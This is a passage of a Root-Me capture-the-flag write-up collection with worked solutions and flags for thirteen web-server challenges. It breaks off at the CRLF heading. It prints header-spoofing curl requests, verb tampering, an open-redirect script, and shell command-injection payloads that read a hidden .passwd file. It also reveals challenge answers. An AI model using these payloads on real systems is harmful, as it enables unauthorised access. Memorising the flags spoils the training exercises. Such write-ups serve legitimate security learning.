# [Root-Me](./rootme.md) Root-Me Web Server [33/74]

Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!

These challenges are designed to train users on HTML, HTTP and other server side mechanisms. The following series of challenges will cultivate a better understanding of techniques such as : Basic workings of multiple authentication mechanisms, handling form data, inner workings of web applications, etc. ...

## Contents

1. [HTML - Source code](#html-source-code) 🗸
2. [HTTP - IP restriction bypass](#http-ip-restriction-bypass) 🗸
3. [HTTP - Open redirect](#http-open-redirect) 🗸
4. [HTTP - User-agent](#http-user-agent) 🗸
5. [Weak password](#weak-password) 🗸
6. [PHP - Command injection](#php-command-injection) 🗸
7. [Backup file](#backup-file) 🗸
8. [HTTP - Directory indexing](#http-directory-indexing) 🗸
9. [HTTP - Headers](#http-headers) 🗸
10. [HTTP - POST](#http-post) 🗸
11. [HTTP - Improper redirect](#http-improper-redirect) 🗸
12. [HTTP - Verb tampering](#http-verb-tampering) 🗸
13. [Install files](#install-files) 🗸
14. [CRLF](#crlf) 🗸
15. [File upload - Double extensions](#file-upload-double-extensions) 🗸
16. [File upload - MIME type](#file-upload-mime-type) 🗸
17. [HTTP - Cookies](#http-cookies) 🗸
18. [Insecure Code Management](#insecure-code-management) 🗸
19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction) 🗸
20. [Directory traversal](#directory-traversal) 🗸
21. [File upload - Null byte](#file-upload-null-byte) 🗸
22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret) 🗸
23. [JWT - Revoked token](#jwt-revoked-token) 🗸
24. [PHP - assert()](#php-assert) 🗸
25. [PHP - Filters](#php-filters) 🗸
26. [PHP - register globals](#php-register-globals) 🗸
27. [PHP - Remote Xdebug](#php-remote-xdebug)
28. [Python - Server-side Template Injection Introduction](#python-server-side-template-injection-introduction)
29. [File upload - ZIP](#file-upload-zip)
30. [Command injection - Filter bypass](#command-injection-filter-bypass)
31. [Java - Server-side Template Injection](#java-server-side-template-injection)
32. [JSON Web Token (JWT) - Public key](#json-web-token-jwt-public-key)
33. [Local File Inclusion](#local-file-inclusion) 🗸
34. [Local File Inclusion - Double encoding](#local-file-inclusion-double-encoding) 🗸
35. [Node - Eval](#node-eval)
36. [PHP - Loose Comparison](#php-loose-comparison)
37. [PHP - preg_replace()](#php-preg-replace) 🗸
38. [PHP - type juggling](#php-type-juggling) 🗸
39. [Remote File Inclusion](#remote-file-inclusion)
40. [SQL injection - Authentication](#sql-injection-authentication) 🗸
41. [SQL injection - Authentication - GBK](#sql-injection-authentication-gbk)
42. [SQL injection - String](#sql-injection-string) 🗸
43. [XSLT - Code execution](#xslt-code-execution)
44. [LDAP injection - Authentication](#ldap-injection-authentication) 🗸
45. [Node - Serialize](#node-serialize)
46. [NodeJS - Prototype Pollution Bypass](#nodejs-prototype-pollution-bypass)
47. [NoSQL injection - Authentication](#nosql-injection-authentication)
48. [PHP - Path Truncation](#php-path-truncation)
49. [PHP - Serialization](#php-serialization)
50. [SQL injection - Numeric](#sql-injection-numeric)
51. [SQL Injection - Routed](#sql-injection-routed)
52. [SQL Truncation](#sql-truncation)
53. [XML External Entity](#xml-external-entity)
54. [XPath injection - Authentication](#xpath-injection-authentication)
55. [Yaml - Deserialization](#yaml-deserialization)
56. [GraphQL](#graphql)
57. [Java - Spring Boot](#java-spring-boot)
58. [Local File Inclusion - Wrappers](#local-file-inclusion-wrappers)
59. [PHP - Eval](#php-eval)
60. [PHP - Unserialize overflow](#php-unserialize-overflow)
61. [SQL injection - Error](#sql-injection-error)
62. [SQL injection - Insert](#sql-injection-insert)
63. [SQL injection - File reading](#sql-injection-file-reading)
64. [XPath injection - String](#xpath-injection-string)
65. [NoSQL injection - Blind](#nosql-injection-blind)
66. [SQL injection - Time based](#sql-injection-time-based)
67. [NodeJS - vm escape](#nodejs-vm-escape)
68. [Server Side Request Forgery](#server-side-request-forgery)
69. [SQL injection - Blind](#sql-injection-blind)
70. [LDAP injection - Blind](#ldap-injection-blind)
71. [PHP - Unserialize Pop Chain](#php-unserialize-pop-chain)
72. [Python - Blind SSTI Filters Bypass](#python-blind-ssti-filters-bypass)
73. [XPath injection - Blind](#xpath-injection-blind)
74. [SQL injection - Filter bypass](#sql-injection-filter-bypass)


---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTML Source Code

- Author: g0uZ
- Date: 3 October 2006
- Points: 5
- Level: 1

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch1/).

### Resources

1. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <!--
Bienvenue sur ce portail,
Welcome on this portal,
J'espère que vous passerez un agréable moment parmi nous, mais surtout que vous repartirez plein de choses dans la tête...
I hope that you will enjoy your time among us, and above that all you will leave with lots of things in the head ...
@ très bientôt
See ya
-->
    <h1>Login v0.00001
    </h1>
    <form>
      Password&nbsp;
      <input type="password" value="" name="password"/>
      <br/>
      <input type="submit" value="login" />
    </form>
    <!--
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
-->
  </body>
</html>
~~~

We can see the password is included in the html.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
nZ^&@q5&sjJHev0
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP IP restriction bypass

- Author: Cyrhades
- Date: 23 March 2021
- Points: 10
- Level: 1

### Statement

Dear colleagues,

We’re now managing connections to the intranet using private IP addresses, so it’s no longer necessary to login with a username / password when you are already connected to the internal company network.

Regards,

The network admin

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch68/).

### Resources

1. [RFC 1918](https://repository.root-me.org/RFC/EN%20-%20rfc1918.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>Secured Intranet
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <span>Your IP 
      <strong>::ffff:86.13.104.48
      </strong> do not belong to the LAN.
    </span>
    <h1>Intranet
    </h1>
    <form method="post">
      <p>
        <label for="login">Login:
        </label>
        <input type="text" name="login">
      </p>
      <p>
        <label for="pass">Password:
        </label>
        <input type="text" name="mdp">
      </p>
      <p>
        <input type="submit" value="login">
      </p>
      <p>
        <small>You should authenticate because you're not on the LAN.
        </small>
      </p>
    </form>
  </body>
</html>
~~~

Assuming the LAN is a private IP address, we can send a curl request with a custom IP 192.168.0.2:

~~~shell
$ curl --header "X-Forwarded-For: 192.168.0.1" http://challenge01.root-me.org/web-serveur/ch68/
~~~

We get a html response with the solution:

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>Secured Intranet
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>Intranet
    </h1>
    <div>
      Well done, the validation password is: 
      <strong>Ip_$po0Fing
      </strong>
    </div>
  </body>
</html>
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
Ip_$po0Fing
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Open redirect

- Author: Swissky
- Date: 2 August 2017
- Points: 10
- Level: 1

### Statement

Find a way to make a redirection to a domain other than those showed on the web page.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch52/).

### Resources

1. [Understanding and Discovering Open Redirect Vulnerabilities](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Understanding%20and%20Discovering%20Open%20Redirect%20Vulnerabilities%20-%20Trustwave.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>HTTP - Open redirect
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>Social Networks
    </h1>
    <a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook
    </a>
    <a href='?url=https://twitter.com&h=be8b09f7f1f66235a9c91986952483f0'>twitter
    </a>
    <a href='?url=https://slack.com&h=e52dc719664ead63be3d5066c135b6da'>slack
    </a>
    <style type="text/css">
      body{
        text-align: center;
        font-family: arial;
      }
      a{
        color: #FFFFFF;
        text-decoration: none;
        text-transform: capitalize;
        padding: 8px;
        background-color: #1CB2D2;
        border-radius: 5px;
        width: 100px;
        display: inline-block;
      }
      a:hover{
        background-color: #3968A9;
      }
      #error{
        color: red;
        font-weight: bold;
      }
    </style>
  </body>
</html>
~~~

We can see 3 links to facebook, twitter and slack.  These links are redirects that include the string md5 hash.  We can test it with a new redirect:

~~~
?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f
~~~

When navigating, we can see the site briefly redirects to the flag before redirecting to the directed website.  We can write a short Python script to capture the flag:

~~~py
import hashlib
import requests

URL = "http://challenge01.root-me.org/web-serveur/ch52/"
a = "https://google.com"
b = hashlib.md5(a.encode())

redirect = "?url="+a+"&h="+b.hexdigest()
print(redirect)

r = requests.Session()
website = r.get(URL+redirect)
print(website.text)
~~~

We get the intermediary redirect as the response:

~~~html
<!DOCTYPE html>
<html>
<head>
        <title>HTTP - Open redirect</title>
</head>


<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5
</p><script>document.location = 'https://google.com';</script>
<style type="text/css">
        body{
                text-align: center;
                font-family: arial;
        }

        a{
                color: #FFFFFF;
                text-decoration: none;
                text-transform: capitalize;
                padding: 8px;
                background-color: #1CB2D2;
                border-radius: 5px;
                width: 100px;
                display: inline-block;
        }
        a:hover{
                background-color: #3968A9;
        }

        #error{
                color: red;
                font-weight: bold;
        }

</style>
</body>
</html>
~~~

This gives us the challenge solution

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
e6f8a530811d5a479812d7b82fc1a5c5
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP User agent

- Author: g0uZ
- Date: 3 October 2006
- Points: 10
- Level: 1

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch2/).

### Resources

1. [RFC 2616](https://repository.root-me.org/RFC/EN%20-%20rfc2616.txt).
2. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page which we can format using an [online beautier](https://htmlbeautify.com/):

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h3>Wrong user-agent: you are not the "admin" browser!
    </h3>
  </body>
</html>
~~~

We have the wrong user agent.  We can use curl to visit the site with a custom user agent:

~~~shell
$ curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
~~~

We get the html response:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h3>Welcome master!
      <br/>Password: rr$Li9%L34qd1AAe27
    </h3>
  </body>
</html>
~~~

This gives us the challenge solution

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
rr$Li9%L34qd1AAe27
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Weak password

- Author: g0uZ
- Date: 3 October 2006
- Points: 10
- Level: 1

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch3/).

### Resources

1. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).
2. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
3. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Navigating to the challenge site, we try "admin/admin" and are logged in!

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
admin
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## PHP Command Injection

- Author: sambecks
- Date: 20 September 2017
- Points: 10
- Level: 1

### Statement

Find a vulnerability in this service and exploit it.

The flag is on the index.php file.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch54/).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Navigating to the challenge site, we find the html site:

~~~html
<html>
  <head>
    <title>Ping Service
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <form method="POST" action="index.php">
      <input type="text" name="ip" placeholder="127.0.0.1">
      <input type="submit">
    </form>
    <pre>
</pre>
  </body>
</html>
~~~

We can see the ip address is passed to a "ping" command, and the website prints the shell output.  We can inject shell commands into the form:

~~~
8.8.8.8; ls -l
~~~

The webpage returns:

~~~
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=1.99 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=1.95 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=1.85 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 1.851/1.931/1.992/0.059 ms
total 4
-rw-r----- 1 web-serveur-ch54 www-data 438 Dec 10 21:20 index.php
~~~

We can see the index.php file there. trying cat returns a second form.  We can now view the php code:

~~~php
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
~~~

We can see the flag is stored in a hidden file .passwd.  We can view this with inject:

~~~
8.8.8.8; cat .passwd
~~~

This gives us the solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
S3rv1ceP1n9Sup3rS3cure
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Backup File

- Author: g0uZ
- Date: 27 February 2011
- Points: 15
- Level: 2

### Statement

No clue.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch11/).

### Resources

1. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).
2. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
3. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page with a form:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>Authentication v 0.00
    </h1>
    <h3>Error : no such user/password
      </h2>
    <br />
    <form action="" method="post">
      Login&nbsp;
      <br/>
      <input type="text" name="username" />
      <br/>
      <br/>
      Password&nbsp;
      <br/>
      <input type="password" name="password" />
      <br/>
      <br/>
      <br/>
      <br/>
      <input type="submit" value="connect" />
      <br/>
      <br/>
    </form>
  </body>
</html>

~~~

Inspecting the sources, we see a file (index).  This is likely a php file so we can navigate to /index.php.  We get the website, so we now know the site uses PHP. Assuming the file has been mistakenly left on the server, we can look for index.php~ which will be a remnant from a make command when not run with the clean flag.  We try index.php and find:

~~~html
<?php

$username="ch11";
$password="OCCY9AcNm1tj";


echo '
      <html>
      <body>
	<h1>Authentication v 0.00</h1>
';

if ($_POST["username"]!="" && $_POST["password"]!=""){
    if ($_POST["username"]==$user && $_POST["password"]==$password)
    {
      print("<h2>Welcome back {$row['username']} !</h2>");
      print("<h3>Your informations :</h3><p>- username : $row[username]</p><br />");
      print("To validate the challenge use this password</b>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");

    }
}

echo '
	<form action="" method="post">
	  Login&nbsp;<br/>
	  <input type="text" name="username" /><br/><br/>
	  Password&nbsp;<br/>
	  <input type="password" name="password" /><br/><br/>
	  <br/><br/>
	  <input type="submit" value="connect" /><br/><br/>
	</form>
      </body>
      </html>
';

?> 
~~~

We can now login to the website with the username and password specified and get a message telling us the password is the challenge solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
OCCY9AcNm1tj
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Directory Indexing

- Author: g0uZ
- Date: 27 February 2011
- Points: 15
- Level: 2

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch4/).

### Resources

1. [RFC 2616](https://repository.root-me.org/RFC/EN%20-%20rfc2616.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <!-- include("admin/pass.html") -->
  </body>
</html>
~~~

We see reference to a file admin/pass.html.  Visiting this site we see it is a red herring:

~~~html
<html>
  <head>
    <title>HTTP directory indexing
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <center>
      <br/>
      <br/>
      J'ai bien l'impression que tu t'es fait avoir / Got rick rolled ? ;)
      <br/>
      T'inqui&egrave;te tu n'es pas le dernier / You're not the last  :p
      <br/>
      <br/>
      Cherche BIEN / Just search
      <br/>
      <br/>
    </center>
  </body>
</html>
~~~

Visiting the URL http://challenge01.root-me.org/web-serveur/ch4/admin/ we see the site directory:

~~~
/web-serveur/ch4/admin/
File Name  ↓ 		File Size  ↓ 	Date  ↓ 
Parent directory/	-				-
backup/				-				2021-Dec-10 21:35
pass.html			346 B			2021-Dec-10 21:35
~~~

We can navigate to backup/admin.txt and find:

~~~
Password / Mot de passe : LINUX
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
LINUX
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Headers

- Author: Arod
- Date: 11 January 2015
- Points: 15
- Level: 2

### Statement

Get an administrator access to the webpage.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch5/).

### Resources

1. [RFC 2616](https://repository.root-me.org/RFC/EN%20-%20rfc2616.txt).
2. [RFC 1945](https://repository.root-me.org/RFC/EN%20-%20rfc1945.txt).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <p>Content is not the only part of an HTTP response!
    </p>
  </body>
</html>
~~~

Using CURL, we can view the response header from the site:

~~~shell
$ curl --head http://challenge01.root-me.org/web-serveur/ch5/
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 09 Jan 2022 14:43:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Header-RootMe-Admin: none
~~~

We can change the "Header-RootMe-Admin" header using CURL:

~~~shell
$ curl --header "Header-RootMe-Admin: True" http://challenge01.root-me.org/web-serveur/ch5/
~~~

We get a different html response which includes the challenge solution:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <p>Content is not the only part of an HTTP response!
    </p>
    <p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful
    </p>
  </body>
</html>

~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
HeadersMayBeUseful
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Post

- Author: Th1b4ud
- Date: 14 August 2018
- Points: 15
- Level: 2

### Statement

Find a way to beat the top score!

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch56/).

### Resources

1. [POST_(HTTP)](https://en.wikipedia.org/wiki/POST_(HTTP))

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page:

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>HTTP Basics
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>RandGame
    </h1>
    <h2>Human vs. Machine
    </h2>
    <hr>
    <p>Here is my new game. It's not totally finished but I'm sure nobody can beat me! ;)
    </p>
    <ul>
      <li>Rules: click on the button to hope to generate a great score
      </li>
      <li>Score to beat: 
        <strong>999999
        </strong>
      </li>
    </ul>
    <form action="" method="post" onsubmit="document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)">
      <input type="hidden" name="score" value="-1" />
      <input type="submit" name="generate" value="Give a try!">
    </form>
  </body>
</html>

~~~

We can edit the form using Firefox web tools to:

~~~html
<!DOCTYPE html>
<html>
  <head>
    <title>HTTP Basics
    </title>
  </head>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <h1>RandGame
    </h1>
    <h2>Human vs. Machine
    </h2>
    <hr>
    <p>Here is my new game. It's not totally finished but I'm sure nobody can beat me! ;)
    </p>
    <ul>
      <li>Rules: click on the button to hope to generate a great score
      </li>
      <li>Score to beat: 
        <strong>999999
        </strong>
      </li>
    </ul>
    <form action="" method="post" onsubmit="document.getElementsByName('score')[0].value = 1000001)">
      <input type="hidden" name="score" value="1000001" />
      <input type="submit" name="generate" value="Give a try!">
    </form>
  </body>
</html>
~~~

Submitting the form, we get the flag.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
H7tp_h4s_N0_s3Cr37S_F0r_y0U
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Improper redirect

- Author: Arod
- Date: 26 November 2014
- Points: 15
- Level: 2

### Statement

Get access to index.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch32/).

### Resources

1. [Exploiting Improper Redirection in PHP Web Applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20Improper%20Redirection%20in%20PHP%20Web%20Applications.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we find a html page:

~~~html
<html>
  <body>
    <link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' />
    <iframe id='iframe' src='https://www.root-me.org/?page=externe_header'>
    </iframe>
    <p>You must be authenticated in order to access this page !
    </p>
    <form method="post" name="form" action="login.php">
      <p>Login : 
        <input type="text" name="login" >
      </p>
      <p>Password : 
        <input type="password" name="password" >
      </p>
      <p>
        <input type="submit" value="Log in" >
      </p>
    </form>
  </body>
</html>
~~~

When we try to access index.php we are redirected to login.php, however in CURL we can see the content of the index.php before redirection:

~~~shell
$ curl http://challenge01.root-me.org/web-serveur/ch32/index.php
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<h1>Welcome !</h1>

<p>Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...</p>
<p><a href="http://cwe.mitre.org/data/definitions/698.html">CWE-698: Execution After Redirect (EAR)</a></p>
<p>The flag is : ExecutionAfterRedirectIsBad
</p>
</body>
</html>
~~~

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
ExecutionAfterRedirectIsBad
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## HTTP Verb tampering

- Author: g0uZ
- Date: 3 February 2011
- Points: 15
- Level: 2

### Statement

Bypass the security establishment.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch8/).

### Resources

1. [RFC 2617](https://repository.root-me.org/RFC/EN%20-%20rfc2617.txt).
2. [RFC 2069](https://repository.root-me.org/RFC/EN%20-%20rfc2069.txt).
3. [HTTP basic authentication and digest authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTP%20basic%20authentication%20and%20digest%20authentication.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we get a prompt for a username and password.

We can use CURL to submit a GET request:

~~~shell
$ curl -X GET http://challenge01.root-me.org/web-serveur/ch8/
~~~

We get the standard response:

~~~html
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<title>401 Authorization Required</title>
</head><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<h1>Authorization Required</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr/>
<address>Apache Server at challenge01.root-me.org Port 80</address>

</body></html>
~~~

We can see the website uses Apache Server, and the challenge suggests we should be using different verbs.  We can find various [HTTP request methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods).  Trying PUT with CURL we get:

~~~shell
$curl -X PUT http://challenge01.root-me.org/web-serveur/ch8/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$dme96d3saez$$prap
</h1>
</body></html>
~~~

This gives us the password.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
a23e$dme96d3saez$$prap
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## Install files

- Author: g0uZ
- Date: 7 October 2006
- Points: 15
- Level: 2

### Statement

None.

### Links

1. [challenge site](http://challenge01.root-me.org/web-serveur/ch6/).

### Resources

1. [OWASP testing guide v2](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v2.pdf).
2. [OWASP testing guide v3](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v3.pdf).
3. [OWASP testing guide v4](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf).

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Visiting the website, we get an empty webpage:

~~~html
<!--  /web-serveur/ch6/phpbb -->
~~~

We can visit the /phpbb site:

~~~html
<html>
  <head>
    <title></title>
    <meta content="">
    <style></style>
  </head>
 <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe></body>
</html>
~~~

[PHPBB](https://www.phpbb.com/) is a bulletin board software package that can be deployed on web servers.  We can find the [installation guide](https://www.phpbb.com/community/docs/INSTALL.html) which provides details of the various directories:

~~~
phpbb/store
phpbb/cache
phpbb/files
phpbb/images
phpbb/install
~~~

Following the helpful challenge name, we can visit /phpbb/install and get a webpage:

~~~html
<html>

<head>
  <title></title>
</head>

<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>

Bravo, vous venez de decouvrir une des nombreuses failles de phpBB.<br>
<br>
Cette faille est en fait un oubli du Webmaster qui aurait du enlever<br>
ces dossiers. Ils contiennent les pages d'installations du forum phpbb.<br>
Ce genre de chose n'existe plus car les développeurs mettent en place des<br>
systèmes de vérification pour faciliter la tâche aux plus têtes en l'air<br>
Ce qu'il faut comprendre par contre c'est qu'on découvre souvent beaucoup de choses<br>
en trifouillant des URL...<br> 
Grâce à elles, vous pouvez remettre à zéro le forum, et changer tous les passwords<br>
administrateur, étant donné que vous reinitialisez le forum.<br>
Vous avez donc ensuite un contrôle total du forum !!<br>
<br>
Le mot de passe pour valider est : karambar<br>
<br>
Bon courage !

</body>

</html>
~~~

This gives us the challenge solution.

</details>

### Answer

<details>

<summary markdown="span">Answer</summary>

~~~
karambar
~~~

</details>

---

### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)

---

## crlf

- Author: g0uZ
